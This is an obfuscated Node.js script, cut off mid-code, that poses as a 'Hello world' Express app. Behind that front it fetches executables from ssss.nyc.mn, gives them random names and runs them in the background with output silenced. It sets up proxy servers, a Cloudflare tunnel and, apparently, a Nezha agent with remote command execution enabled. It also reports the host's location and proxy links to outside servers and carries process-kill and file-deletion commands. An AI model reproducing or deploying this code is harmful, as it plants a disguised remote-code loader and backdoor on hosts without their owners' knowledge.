const _0x519716=_0x2c57;(function(_0x5253d3,_0x3d8afe){const _0x590225={_0x406b2e:0x109,_0x5fa0e9:0x116,_0x57c501:0x10c,_0x926e8e:0xd0,_0x421bdb:0xc4,_0x44e035:0x114},_0x4469a5=_0x2c57,_0x19359a=_0x5253d3();while(!![]){try{const _0xbc9505=parseInt(_0x4469a5(_0x590225._0x406b2e))/0x1*(-parseInt(_0x4469a5(_0x590225._0x5fa0e9))/0x2)+parseInt(_0x4469a5(_0x590225._0x57c501))/0x3*(-parseInt(_0x4469a5(0xdb))/0x4)+-parseInt(_0x4469a5(0xa0))/0x5*(parseInt(_0x4469a5(0xc2))/0x6)+parseInt(_0x4469a5(_0x590225._0x926e8e))/0x7+-parseInt(_0x4469a5(_0x590225._0x421bdb))/0x8+-parseInt(_0x4469a5(0x95))/0x9+parseInt(_0x4469a5(_0x590225._0x44e035))/0xa;if(_0xbc9505===_0x3d8afe)break;else _0x19359a['push'](_0x19359a['shift']());}catch(_0x182746){_0x19359a['push'](_0x19359a['shift']());}}}(_0x4f81,0x733f7));function _0x4f81(){const _0x161cac=['nohup\x20','unlink','tcp','--tls','rm\x20-rf\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tls','web\x20running\x20error:\x20','Error\x20in\x20startserver:','env','existsSync','toString','&fp=firefox&type=ws&host=','Empowerment\x20failed\x20for\x20','\x20is\x20created','Error\x20reading\x20boot.log:','get','SERVER_PORT','amd','\x20-p\x20','data','\x0a\x20\x20credentials-file:\x20','success','7859925nnIvUw','utf-8','127.0.0.1','https://arm64.ssss.nyc.mn/bot','vmess','ArgoDomain:','list.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','writeFileSync','xtls-rprx-vision','/config.json\x20>/dev/null\x202>&1\x20&','351195UzVdOg','response','http','\x20>/dev/null\x202>&1','\x20successfully','del\x20/f\x20/q\x20','Unhandled\x20error\x20in\x20startserver:','match','2087','Add\x20automatic\x20access\x20task\x20faild:\x20','cdns.doon.eu.org','status','config.json','child_process','ARGO_DOMAIN:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','random','&path=%2Fvless-argo%3Fed%3D2560#','length','Error\x20downloading\x20files:','unlinkSync','ARGO_AUTH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','mkdirSync','log','forEach','Hello\x20world!','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','fileUrl','/trojan-argo','finish','send','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','48agNbdS','error','5546520VFtOUo','\x20>/dev/null\x202>&1\x20&','\x0avless://','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','sub.txt','Unknown','message','readFileSync','join','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','trojan','filter','5535481lSgGIC','clear','win32','\x20is\x20running','?encryption=none&security=tls&sni=','catch','https://oooo.serv00.net/add-url','post','\x0a\x0atrojan://','/tunnel.yml\x20run','test','776GRRkoR','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https+local://8.8.8.8/dns-query','UUID','.exe\x20>\x20nul\x202>&1','application/json','taskkill\x20/f\x20/im\x20','Skipping\x20adding\x20automatic\x20access\x20task','org','https://amd64.ssss.nyc.mn/bot','arm','Subscription\x20uploaded\x20successfully','block','close','aarch64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','UPLOAD_URL','config.yaml','SUB_PATH','from','/sub.txt\x20saved\x20successfully','true','App\x20is\x20running','createWriteStream','tunnel.json','CFIP','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','base64','vless','/api/add-subscriptions','\x20-s\x20','AUTO_ACCESS','basename','./tmp','PROJECT_URL','floor','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','stream','listen','pkill\x20-f\x20\x22[','false','https://ipapi.co/json/','quic','/dev/null','Content-Type','arch','121AwkyiC','PORT','https://arm64.ssss.nyc.mn/agent','8958DQutie','stringify','2053','platform','countryCode','abcdefghijklmnopqrstuvwxyz','6dcfc5a3-3aa7-4c2e-ba09-072b72e9c592','charAt','24715090EJxqJm','none','1362FzqlKc','443','all','split','/vless-argo','/vmess-argo?ed=2560','includes','2096','\x20already\x20exists','/vmess-argo','then','direct','firefox','https://amd64.ssss.nyc.mn/v1','unshift','express','text/plain;\x20charset=utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Empowerment\x20success\x20for\x20','2083','freedom','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x0avmess://','automatic\x20access\x20task\x20added\x20successfully','8443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x22\x20>\x20/dev/null\x202>&1','substring','https://amd64.ssss.nyc.mn/agent','pop','\x0a\x20\x20\x20\x20','chmod','boot.log','tunnel.yml','has','push','Error\x20executing\x20command:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20failed:\x20','sub','arm64','Download\x20','TunnelSecret','set','CFPORT','NEZHA_PORT','exec','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1'];_0x4f81=function(){return _0x161cac;};return _0x4f81();}const express=require(_0x519716(0x125)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x519716(0xad))[_0x519716(0x144)]),{execSync}=require(_0x519716(0xad)),UPLOAD_URL=process[_0x519716(0x150)][_0x519716(0xeb)]||'',PROJECT_URL=process['env'][_0x519716(0xfd)]||'',AUTO_ACCESS=process['env'][_0x519716(0xfa)]||![],FILE_PATH=process[_0x519716(0x150)]['FILE_PATH']||_0x519716(0xfc),SUB_PATH=process['env'][_0x519716(0xed)]||_0x519716(0x13d),PORT=process[_0x519716(0x150)][_0x519716(0x158)]||process[_0x519716(0x150)][_0x519716(0x10a)]||0xbb8,UUID=process['env'][_0x519716(0xde)]||_0x519716(0x112),NEZHA_SERVER=process[_0x519716(0x150)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x519716(0x150)][_0x519716(0x143)]||'',NEZHA_KEY=process[_0x519716(0x150)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x519716(0x150)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x519716(0x150)][_0x519716(0xb5)]||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x519716(0xf4)]||_0x519716(0xaa),CFPORT=process['env'][_0x519716(0x142)]||0x1bb,NAME=process[_0x519716(0x150)]['NAME']||'us';!fs[_0x519716(0x151)](FILE_PATH)?(fs[_0x519716(0xb7)](FILE_PATH),console[_0x519716(0xb8)](FILE_PATH+_0x519716(0x155))):console[_0x519716(0xb8)](FILE_PATH+_0x519716(0x11e));function generateRandomName(){const _0x263814={_0x4d2ca5:0x113,_0x2c85d8:0xfe,_0x46ae7d:0xb0},_0x25b9a6=_0x519716,_0x42560d=_0x25b9a6(0x111);let _0x52f745='';for(let _0x567a62=0x0;_0x567a62<0x6;_0x567a62++){_0x52f745+=_0x42560d[_0x25b9a6(_0x263814._0x4d2ca5)](Math[_0x25b9a6(_0x263814._0x2c85d8)](Math[_0x25b9a6(_0x263814._0x46ae7d)]()*_0x42560d['length']));}return _0x52f745;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x519716(0xcc)](FILE_PATH,npmName),phpPath=path[_0x519716(0xcc)](FILE_PATH,phpName),webPath=path[_0x519716(0xcc)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x519716(0xcc)](FILE_PATH,_0x519716(0xc8)),listPath=path[_0x519716(0xcc)](FILE_PATH,_0x519716(0x9b)),bootLogPath=path[_0x519716(0xcc)](FILE_PATH,'boot.log'),configPath=path[_0x519716(0xcc)](FILE_PATH,_0x519716(0xac));function deleteNodes(){const _0x19b025={_0x2ea0be:0xcb,_0x53aafe:0x96,_0x5e865d:0xee,_0xd73967:0xf6,_0xe62aaf:0x96,_0x2db5bb:0x119,_0x96f7ae:0xcf,_0x4b4a37:0xb2,_0x586a88:0xd5},_0x54ed11=_0x519716;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x32b4f7;try{_0x32b4f7=fs[_0x54ed11(_0x19b025._0x2ea0be)](subPath,_0x54ed11(_0x19b025._0x53aafe));}catch{return null;}const _0x2b1a22=Buffer[_0x54ed11(_0x19b025._0x5e865d)](_0x32b4f7,_0x54ed11(_0x19b025._0xd73967))[_0x54ed11(0x152)](_0x54ed11(_0x19b025._0xe62aaf)),_0x3f729a=_0x2b1a22[_0x54ed11(_0x19b025._0x2db5bb)]('\x0a')[_0x54ed11(_0x19b025._0x96f7ae)](_0x4470ec=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x54ed11(0xda)](_0x4470ec));if(_0x3f729a[_0x54ed11(_0x19b025._0x4b4a37)]===0x0)return;return axios[_0x54ed11(0xd7)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x54ed11(0x10d)]({'nodes':_0x3f729a}),{'headers':{'Content-Type':'application/json'}})[_0x54ed11(_0x19b025._0x586a88)](_0x1c958e=>{return null;}),null;}catch(_0x45ee6a){return null;}}function cleanupOldFiles(){const _0x5ee939=_0x519716;try{const _0x56ceb3=fs['readdirSync'](FILE_PATH);_0x56ceb3[_0x5ee939(0xb9)](_0x11e622=>{const _0x2c31a4=_0x5ee939,_0x1eaabd=path[_0x2c31a4(0xcc)](FILE_PATH,_0x11e622);try{const _0x1ca3d5=fs['statSync'](_0x1eaabd);_0x1ca3d5['isFile']()&&fs[_0x2c31a4(0xb4)](_0x1eaabd);}catch(_0x5de831){}});}catch(_0x2429dc){}}app['get']('/',function(_0x32fad4,_0x2750e8){const _0x77818={_0x393af7:0xba},_0x238cd7=_0x519716;_0x2750e8[_0x238cd7(0xc0)](_0x238cd7(_0x77818._0x393af7));});async function generateConfig(){const _0x28601b={_0x5da6ee:0x115,_0x554ded:0x11a,_0x263931:0x11f,_0xde62a9:0x149,_0x5b9861:0xf7,_0x5c0c19:0x11a,_0x281e50:0x14d,_0xb99c5e:0xa2,_0x1464c5:0x105,_0x134cc2:0x97,_0x20ab3a:0xce,_0x3ed6e5:0xbe,_0x272fed:0x14d,_0xd71192:0x105,_0x469807:0xe7,_0x571665:0xcc},_0x4cb544=_0x519716,_0x382192={'log':{'access':_0x4cb544(0x106),'error':_0x4cb544(0x106),'loglevel':_0x4cb544(0x115)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4cb544(0x9e)}],'decryption':_0x4cb544(_0x28601b._0x5da6ee),'fallbacks':[{'dest':0xbb9},{'path':_0x4cb544(_0x28601b._0x554ded),'dest':0xbba},{'path':_0x4cb544(_0x28601b._0x263931),'dest':0xbbb},{'path':_0x4cb544(0xbe),'dest':0xbbc}]},'streamSettings':{'network':_0x4cb544(_0x28601b._0xde62a9)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x4cb544(0x149),'security':'none'}},{'port':0xbba,'listen':_0x4cb544(0x97),'protocol':_0x4cb544(_0x28601b._0x5b9861),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4cb544(_0x28601b._0x5da6ee)},'streamSettings':{'network':'ws','security':_0x4cb544(0x115),'wsSettings':{'path':_0x4cb544(_0x28601b._0x5c0c19)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cb544(0xa2),_0x4cb544(_0x28601b._0x281e50),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4cb544(0x99),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4cb544(_0x28601b._0xb99c5e),_0x4cb544(0x14d),_0x4cb544(_0x28601b._0x1464c5)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4cb544(_0x28601b._0x134cc2),'protocol':_0x4cb544(_0x28601b._0x20ab3a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4cb544(_0x28601b._0x5da6ee),'wsSettings':{'path':_0x4cb544(_0x28601b._0x3ed6e5)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cb544(0xa2),_0x4cb544(_0x28601b._0x272fed),_0x4cb544(_0x28601b._0xd71192)],'metadataOnly':![]}}],'dns':{'servers':[_0x4cb544(0xdd)]},'outbounds':[{'protocol':_0x4cb544(0x12a),'tag':_0x4cb544(0x121)},{'protocol':'blackhole','tag':_0x4cb544(_0x28601b._0x469807)}]};fs['writeFileSync'](path[_0x4cb544(_0x28601b._0x571665)](FILE_PATH,_0x4cb544(0xac)),JSON[_0x4cb544(0x10d)](_0x382192,null,0x2));}function getSystemArchitecture(){const _0x47c9df={_0x507d6a:0x108,_0x3cdd8e:0xe9,_0x641474:0xe5,_0x387ba4:0x159},_0x5bc65e=_0x519716,_0xb7293=os[_0x5bc65e(_0x47c9df._0x507d6a)]();return _0xb7293==='arm'||_0xb7293===_0x5bc65e(0x13e)||_0xb7293===_0x5bc65e(_0x47c9df._0x3cdd8e)?_0x5bc65e(_0x47c9df._0x641474):_0x5bc65e(_0x47c9df._0x387ba4);}function downloadFile(_0xb8de9e,_0x533ba2,_0x59611a){const _0xc550b3={_0xb18233:0x151,_0x439c08:0xb7,_0x27bc83:0xf2,_0x319692:0x120},_0x4f14c6={_0x1f70d4:0x13c,_0x4abc8d:0xca},_0x4b4c2d=_0x519716,_0x19cb38=_0xb8de9e;!fs[_0x4b4c2d(_0xc550b3._0xb18233)](FILE_PATH)&&fs[_0x4b4c2d(_0xc550b3._0x439c08)](FILE_PATH,{'recursive':!![]});const _0x45c9c6=fs[_0x4b4c2d(_0xc550b3._0x27bc83)](_0x19cb38);axios({'method':'get','url':_0x533ba2,'responseType':_0x4b4c2d(0x100)})[_0x4b4c2d(_0xc550b3._0x319692)](_0x33a236=>{const _0x2b6c1c={_0x5b5997:0x13f,_0x632d38:0xfb},_0x213611={_0x1880ab:0xe8,_0x4f8ef9:0xb8},_0x5ae49d=_0x4b4c2d;_0x33a236[_0x5ae49d(0x92)]['pipe'](_0x45c9c6),_0x45c9c6['on'](_0x5ae49d(0xbf),()=>{const _0xd322bf=_0x5ae49d;_0x45c9c6[_0xd322bf(_0x213611._0x1880ab)](),console[_0xd322bf(_0x213611._0x4f8ef9)]('Download\x20'+path['basename'](_0x19cb38)+_0xd322bf(0xa4)),_0x59611a(null,_0x19cb38);}),_0x45c9c6['on'](_0x5ae49d(0xc3),_0x8288f2=>{const _0x36d4af=_0x5ae49d;fs[_0x36d4af(0x148)](_0x19cb38,()=>{});const _0x499a6a=_0x36d4af(_0x2b6c1c._0x5b5997)+path[_0x36d4af(_0x2b6c1c._0x632d38)](_0x19cb38)+'\x20failed:\x20'+_0x8288f2[_0x36d4af(0xca)];console[_0x36d4af(0xc3)](_0x499a6a),_0x59611a(_0x499a6a);});})[_0x4b4c2d(0xd5)](_0x230dc1=>{const _0x34ab2e=_0x4b4c2d,_0x3c6b10=_0x34ab2e(0x13f)+path[_0x34ab2e(0xfb)](_0x19cb38)+_0x34ab2e(_0x4f14c6._0x1f70d4)+_0x230dc1[_0x34ab2e(_0x4f14c6._0x4abc8d)];console[_0x34ab2e(0xc3)](_0x3c6b10),_0x59611a(_0x3c6b10);});}async function downloadFilesAndRun(){const _0x3c8156={_0x1e190a:0x14c,_0x3781cf:0xb3,_0x93232d:0x133,_0x2bab40:0xa8,_0x4207cc:0x129,_0x27f166:0xbb,_0xda1c53:0x9d,_0x43f88c:0xec,_0x5498e9:0x117,_0x4be074:0x10e,_0x19cdd4:0x91,_0x5b0978:0x127,_0x455310:0xd3,_0x14d926:0x13b,_0x11a6dc:0x9f,_0x35e8e3:0xb8,_0x180f59:0xd3,_0x29b1e9:0x14e,_0x401bb6:0x151,_0x5cb978:0xa7,_0x36a510:0x9c,_0xd26dba:0xd9},_0x23d74f=_0x519716,_0x960857=getSystemArchitecture(),_0x30db51=getFilesForArchitecture(_0x960857);if(_0x30db51['length']===0x0){console[_0x23d74f(0xb8)](_0x23d74f(_0x3c8156._0x1e190a));return;}const _0x1da6b6=_0x30db51['map'](_0x4e6502=>{return new Promise((_0x25b3a2,_0x3cda4e)=>{const _0x4c238e=_0x2c57;downloadFile(_0x4e6502['fileName'],_0x4e6502[_0x4c238e(0xbd)],(_0x1c684e,_0x1f69ed)=>{_0x1c684e?_0x3cda4e(_0x1c684e):_0x25b3a2(_0x1f69ed);});});});try{await Promise[_0x23d74f(0x118)](_0x1da6b6);}catch(_0x1334af){console['error'](_0x23d74f(_0x3c8156._0x3781cf),_0x1334af);return;}function _0x4ca7a1(_0x8de44e){const _0x41fb0b={_0x4443fa:0x151},_0x302593={_0x17fe59:0xc3},_0x20b760=_0x23d74f,_0xe408d4=0x1fd;_0x8de44e[_0x20b760(0xb9)](_0x102e1b=>{const _0x50f22e=_0x20b760;fs[_0x50f22e(_0x41fb0b._0x4443fa)](_0x102e1b)&&fs[_0x50f22e(0x135)](_0x102e1b,_0xe408d4,_0x2378d5=>{const _0x3f487c=_0x50f22e;_0x2378d5?console[_0x3f487c(_0x302593._0x17fe59)](_0x3f487c(0x154)+_0x102e1b+':\x20'+_0x2378d5):console[_0x3f487c(0xb8)](_0x3f487c(0x128)+_0x102e1b+':\x20'+_0xe408d4[_0x3f487c(0x152)](0x8));});});}const _0x2381cb=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4ca7a1(_0x2381cb);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x348a40=NEZHA_SERVER[_0x23d74f(0x11c)](':')?NEZHA_SERVER[_0x23d74f(0x119)](':')[_0x23d74f(_0x3c8156._0x93232d)]():'',_0x3319e6=new Set([_0x23d74f(0x117),'8443','2096',_0x23d74f(_0x3c8156._0x2bab40),_0x23d74f(_0x3c8156._0x4207cc),'2053']),_0x398ac0=_0x3319e6[_0x23d74f(0x138)](_0x348a40)?_0x23d74f(0xf0):_0x23d74f(0x103),_0x11e77f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x23d74f(_0x3c8156._0x27f166)+NEZHA_SERVER+_0x23d74f(0x12b)+_0x398ac0+_0x23d74f(0x12f)+UUID;fs[_0x23d74f(_0x3c8156._0xda1c53)](path[_0x23d74f(0xcc)](FILE_PATH,_0x23d74f(_0x3c8156._0x43f88c)),_0x11e77f);const _0x94015f='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x94015f),console[_0x23d74f(0xb8)](phpName+_0x23d74f(0xd3)),await new Promise(_0x1924af=>setTimeout(_0x1924af,0x3e8));}catch(_0x4360b9){console[_0x23d74f(0xc3)]('php\x20running\x20error:\x20'+_0x4360b9);}}else{let _0x1444de='';const _0x358ee3=[_0x23d74f(_0x3c8156._0x5498e9),_0x23d74f(0x12e),_0x23d74f(0x11d),'2087','2083',_0x23d74f(_0x3c8156._0x4be074)];_0x358ee3['includes'](NEZHA_PORT)&&(_0x1444de=_0x23d74f(0x14a));const _0x441a31=_0x23d74f(0x147)+npmPath+_0x23d74f(0xf9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23d74f(_0x3c8156._0x19cdd4)+NEZHA_KEY+'\x20'+_0x1444de+_0x23d74f(_0x3c8156._0x5b0978);try{await exec(_0x441a31),console[_0x23d74f(0xb8)](npmName+_0x23d74f(_0x3c8156._0x455310)),await new Promise(_0x4a6f07=>setTimeout(_0x4a6f07,0x3e8));}catch(_0x423c3b){console[_0x23d74f(0xc3)]('npm\x20running\x20error:\x20'+_0x423c3b);}}}else console[_0x23d74f(0xb8)](_0x23d74f(_0x3c8156._0x14d926));const _0x487bcf=_0x23d74f(0x147)+webPath+'\x20-c\x20'+FILE_PATH+_0x23d74f(_0x3c8156._0x11a6dc);try{await exec(_0x487bcf),console[_0x23d74f(_0x3c8156._0x35e8e3)](webName+_0x23d74f(_0x3c8156._0x180f59)),await new Promise(_0x517a51=>setTimeout(_0x517a51,0x3e8));}catch(_0x38ce59){console[_0x23d74f(0xc3)](_0x23d74f(_0x3c8156._0x29b1e9)+_0x38ce59);}if(fs[_0x23d74f(_0x3c8156._0x401bb6)](botPath)){let _0x48ee5a;if(ARGO_AUTH[_0x23d74f(_0x3c8156._0x5cb978)](/^[A-Z0-9a-z=]{120,250}$/))_0x48ee5a=_0x23d74f(_0x3c8156._0x36a510)+ARGO_AUTH;else ARGO_AUTH[_0x23d74f(_0x3c8156._0x5cb978)](/TunnelSecret/)?_0x48ee5a='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x23d74f(_0x3c8156._0xd26dba):_0x48ee5a=_0x23d74f(0xea)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x48ee5a+'\x20>/dev/null\x202>&1\x20&'),console[_0x23d74f(_0x3c8156._0x35e8e3)](botName+_0x23d74f(_0x3c8156._0x180f59)),await new Promise(_0x2a49a5=>setTimeout(_0x2a49a5,0x7d0));}catch(_0x1507ec){console['error']('Error\x20executing\x20command:\x20'+_0x1507ec);}}await new Promise(_0x5723d2=>setTimeout(_0x5723d2,0x1388));}function getFilesForArchitecture(_0x498bc8){const _0xd0c96b={_0x45468d:0xe5,_0x3e7964:0x98,_0x53cee8:0xe5,_0x5eb9f0:0x132,_0x55ad52:0xe5,_0x4dc346:0x123},_0x23d7c4=_0x519716;let _0x33e461;_0x498bc8===_0x23d7c4(_0xd0c96b._0x45468d)?_0x33e461=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x23d7c4(_0xd0c96b._0x3e7964)}]:_0x33e461=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x23d7c4(0xe4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5aa24f=_0x498bc8===_0x23d7c4(_0xd0c96b._0x53cee8)?_0x23d7c4(0x10b):_0x23d7c4(_0xd0c96b._0x5eb9f0);_0x33e461['unshift']({'fileName':npmPath,'fileUrl':_0x5aa24f});}else{const _0x4e44f6=_0x498bc8===_0x23d7c4(_0xd0c96b._0x55ad52)?'https://arm64.ssss.nyc.mn/v1':_0x23d7c4(_0xd0c96b._0x4dc346);_0x33e461[_0x23d7c4(0x124)]({'fileName':phpPath,'fileUrl':_0x4e44f6});}}return _0x33e461;}function argoType(){const _0x3e1e68={_0x7aff2d:0xb8,_0x1957b2:0xcc,_0x6e3908:0xf3,_0x54c88d:0x119,_0x55ed60:0xb6,_0xdc5fff:0xcd,_0x1b88ff:0x137,_0x2f86f0:0xdc},_0x4cb62e=_0x519716;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4cb62e(_0x3e1e68._0x7aff2d)](_0x4cb62e(0xc1));return;}if(ARGO_AUTH[_0x4cb62e(0x11c)](_0x4cb62e(0x140))){fs['writeFileSync'](path[_0x4cb62e(_0x3e1e68._0x1957b2)](FILE_PATH,_0x4cb62e(_0x3e1e68._0x6e3908)),ARGO_AUTH);const _0x46d805='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4cb62e(_0x3e1e68._0x54c88d)]('\x22')[0xb]+_0x4cb62e(0x93)+path[_0x4cb62e(0xcc)](FILE_PATH,_0x4cb62e(_0x3e1e68._0x6e3908))+_0x4cb62e(_0x3e1e68._0x55ed60)+ARGO_DOMAIN+_0x4cb62e(_0x3e1e68._0xdc5fff)+ARGO_PORT+_0x4cb62e(0xaf);fs['writeFileSync'](path['join'](FILE_PATH,_0x4cb62e(_0x3e1e68._0x1b88ff)),_0x46d805);}else console[_0x4cb62e(0xb8)](_0x4cb62e(_0x3e1e68._0x2f86f0));}async function extractDomains(){const _0x2865b5={_0x4203cd:0xb8,_0x364b89:0x96,_0x547efd:0x9a,_0x526cde:0x136,_0x28e7c6:0xea,_0x2c7c4c:0xf5,_0x5c1809:0xc5,_0x52c5dd:0xd3,_0x1c50e4:0xc3},_0x50763d={_0x3c6417:0x104,_0x4b6f79:0x92,_0x965ec8:0x92,_0xc719be:0xbc,_0x4d9d0f:0xe3,_0x15886d:0x92,_0x545991:0x110,_0x390f46:0xc9},_0x5d4526={_0x2a8881:0x10f,_0x507cc8:0xe1,_0x4d98dc:0xdf},_0x510a94=_0x519716;let _0x59a0fc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x59a0fc=ARGO_DOMAIN,console[_0x510a94(_0x2865b5._0x4203cd)](_0x510a94(0xae),_0x59a0fc),await _0xaa4101(_0x59a0fc);else try{const _0x4dd769=fs[_0x510a94(0xcb)](path[_0x510a94(0xcc)](FILE_PATH,_0x510a94(0x136)),_0x510a94(_0x2865b5._0x364b89)),_0x279e60=_0x4dd769[_0x510a94(0x119)]('\x0a'),_0x40c3bb=[];_0x279e60[_0x510a94(0xb9)](_0xfe421c=>{const _0x47dfef=_0x510a94,_0x4cc5e1=_0xfe421c[_0x47dfef(0xa7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4cc5e1){const _0x101474=_0x4cc5e1[0x1];_0x40c3bb['push'](_0x101474);}});if(_0x40c3bb[_0x510a94(0xb2)]>0x0)_0x59a0fc=_0x40c3bb[0x0],console[_0x510a94(_0x2865b5._0x4203cd)](_0x510a94(_0x2865b5._0x547efd),_0x59a0fc),await _0xaa4101(_0x59a0fc);else{console[_0x510a94(0xb8)](_0x510a94(0xff)),fs[_0x510a94(0xb4)](path['join'](FILE_PATH,_0x510a94(_0x2865b5._0x526cde)));async function _0x2b29c7(){const _0x227276=_0x510a94;try{process[_0x227276(_0x5d4526._0x2a8881)]==='win32'?await exec(_0x227276(_0x5d4526._0x507cc8)+botName+_0x227276(_0x5d4526._0x4d98dc)):await exec(_0x227276(0x102)+botName[_0x227276(0x113)](0x0)+']'+botName[_0x227276(0x131)](0x1)+_0x227276(0x130));}catch(_0x5078e2){}}_0x2b29c7(),await new Promise(_0x172f91=>setTimeout(_0x172f91,0xbb8));const _0x59dcd2=_0x510a94(_0x2865b5._0x28e7c6)+FILE_PATH+_0x510a94(_0x2865b5._0x2c7c4c)+ARGO_PORT;try{await exec(_0x510a94(0x147)+botPath+'\x20'+_0x59dcd2+_0x510a94(_0x2865b5._0x5c1809)),console[_0x510a94(0xb8)](botName+_0x510a94(_0x2865b5._0x52c5dd)),await new Promise(_0x4c33cf=>setTimeout(_0x4c33cf,0xbb8)),await extractDomains();}catch(_0x23c8a6){console[_0x510a94(_0x2865b5._0x1c50e4)](_0x510a94(0x13a)+_0x23c8a6);}}}catch(_0x272fc9){console[_0x510a94(0xc3)](_0x510a94(0x156),_0x272fc9);}async function _0x26f819(){const _0xd100ca=_0x510a94;try{const _0x447886=await axios[_0xd100ca(0x157)](_0xd100ca(_0x50763d._0x3c6417),{'timeout':0xbb8});if(_0x447886[_0xd100ca(0x92)]&&_0x447886[_0xd100ca(_0x50763d._0x4b6f79)][_0xd100ca(0xbc)]&&_0x447886['data']['org'])return _0x447886[_0xd100ca(_0x50763d._0x965ec8)][_0xd100ca(_0x50763d._0xc719be)]+'_'+_0x447886[_0xd100ca(0x92)][_0xd100ca(_0x50763d._0x4d9d0f)];}catch(_0xd06548){try{const _0x4860c5=await axios[_0xd100ca(0x157)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4860c5[_0xd100ca(_0x50763d._0x15886d)]&&_0x4860c5['data'][_0xd100ca(0xab)]===_0xd100ca(0x94)&&_0x4860c5[_0xd100ca(_0x50763d._0x965ec8)][_0xd100ca(_0x50763d._0x545991)]&&_0x4860c5['data'][_0xd100ca(0xe3)])return _0x4860c5[_0xd100ca(0x92)][_0xd100ca(_0x50763d._0x545991)]+'_'+_0x4860c5[_0xd100ca(0x92)][_0xd100ca(_0x50763d._0x4d9d0f)];}catch(_0x16fc86){}}return _0xd100ca(_0x50763d._0x390f46);}async function _0xaa4101(_0xdec5af){const _0x4caf63={_0x775d5e:0x115,_0x1beaab:0x14d,_0x1293bb:0x122,_0x31a91f:0xc6,_0x470af2:0xd4,_0x1519db:0x153,_0x4ede1c:0xb1,_0x4ae07b:0x10d,_0x2e044b:0x134,_0x129101:0xee,_0x231aeb:0x9d,_0x33f849:0xf6,_0x36aca8:0xef},_0x2b5af5=await _0x26f819(),_0x337d5d=NAME?NAME+'-'+_0x2b5af5:_0x2b5af5;return new Promise(_0x1931fd=>{const _0x8497c9={_0x258f6a:0x152,_0x57eed6:0x141};setTimeout(()=>{const 